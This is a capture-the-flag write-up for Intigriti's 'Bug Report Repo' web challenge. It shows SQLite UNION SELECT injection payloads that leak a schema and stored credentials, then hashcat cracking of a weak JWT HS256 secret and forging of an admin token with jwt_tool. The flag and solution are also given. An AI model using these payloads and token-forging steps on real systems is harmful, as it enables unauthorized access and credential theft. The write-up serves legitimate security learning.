# Bug Report Repo [64 Solves]

## Description

> I started my own bug bounty platform! The UI is in the early stages but we've already got plenty of submissions. I wonder why I keep getting emails about a "critical" vulnerability report though, I don't see it anywhere on the system 😕
>
> Author: CryptoCat
>
> <https://bountyrepo.ctf.intigriti.io> || <https://bountyrepo2.ctf.intigriti.io>

No attachments.

## Flag

INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}

## Solution

We can input a bug report ID into the input form and are returned the name who reported it.
For example, an input `1` returns `Bug report from Alice is Open`:

![Bug_Report_Repo_1.png](img/Bug_Report_Repo_1.png)

An input `11` returns `Bug report from ethical_hacker is Open`, but an input `1||1` returns also the same value.
In other words, `1||1` is evaluated to `11`.
Additionally, `true||true` is evaluated to `11`.
This is similar to how Sqlite3 works [^1].

Tested in kali:

```console
$ sqlite3
SQLite version 3.43.2 2023-10-10 12:14:04
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> SELECT 1;
1
sqlite> SELECT 1||1;
11
sqlite> SELECT true;
1
sqlite> SELECT true||true;
11
```

I guess that the Web application has SQL Injection, and try to `UNION SELECT` payload.
I got that `0 UNION SELECT "1","2","3","4","5","6","7","8"` shows `Bug report from 7 is 6`.
`UNION SELECT` SQL Injection was successfull.
All I have to do is to leak the information.

I referes [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) for SQLi payload.

- Input: `0 UNION SELECT "1","2","3","4","5","6",sqlite_version(),"8"`, Output: `Bug report from 3.41.1 is 6`

- Input: `0 UNION SELECT "1","2","3","4","5","6",sql,"8" FROM sqlite_schema`, Output: `Bug report from CREATE TABLE bug_reports ( id INTEGER PRIMARY KEY NOT NULL, category VARCHAR NOT NULL, description TEXT NOT NULL, severity VARCHAR NOT NULL, cvss_score DECIMAL NOT NULL, status VARCHAR NOT NULL, reported_by VARCHAR NOT NULL, reported_date DATE DEFAULT CURRENT_TIMESTAMP NOT NULL) is 6
`

beautified `CREATE TABLE` query:

```sql
CREATE TABLE bug_reports (
  id INTEGER PRIMARY KEY NOT NULL, category VARCHAR NOT NULL, 
  description TEXT NOT NULL, severity VARCHAR NOT NULL, 
  cvss_score DECIMAL NOT NULL, status VARCHAR NOT NULL, 
  reported_by VARCHAR NOT NULL, reported_date DATE DEFAULT CURRENT_TIMESTAMP NOT NULL
)
```

- Input: `0 UNION SELECT "1","2","3","4","5","6",id||"---"||description||"---"||cvss_score||"---"||reported_by,"8" FROM bug_reports WHERE id=11`, Output: `Bug report from 11---crypt0:c4tz on /4dm1n_z0n3, really?!---10---ethical_hacker is 6`

I guess that `crypt0:c4tz` is credential and `/4dm1n_z0n3` is URL path.
Accessed <https://bountyrepo.ctf.intigriti.io/4dm1n_z0n3/>, got the following login form:

![Bug_Report_Repo_2.png](img/Bug_Report_Repo_2.png)

Input the Username and Password form to crypt0 and c4tz respectively, got the Welcome page.

![Bug_Report_Repo_3.png](img/Bug_Report_Repo_3.png)

Next, I need to be the admin.
Looking at the request and response headers to see if I could do anything, and found a JWT token in cookie.

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
```

Looking at the JWT by [jwt_tools](https://github.com/ticarpi/jwt_tool), its' JWT HS256.
I cracked it and it was signed by weak password `catsarethebest`.

```console
$ JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I

$ python3 ~/tools/jwt_tool/jwt_tool.py $JWT

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] identity = "crypt0"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


$ hashcat -m 16500 $JWT /usr/share/wordlists/rockyou.txt --quiet
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I:catsarethebest
```

I re-signed it with identity to admin, set it as a cookie, and accessed the same URL.

```console
$ python3 ~/tools/jwt_tool/jwt_tool.py $JWT -I -pc identity -pv admin --sign hs256 -p catsarethebest

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

jwttool_02990f7554d0eb4e5338cdb8e2f6f4f1 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImFkbWluIn0.3xH8a2FskQJ3afYZeJCtwln4CRrwh4nidEy7S6fJoA0
```

![Bug_Report_Repo_flag.png](img/Bug_Report_Repo_flag.png)

Got the flag.

## Footnotes

[^1]: [SQL Language Expressions](https://www.sqlite.org/lang_expr.html#operators_and_parse_affecting_attributes)
    > The || operator is "concatenate" - it joins together the two strings of its operands.
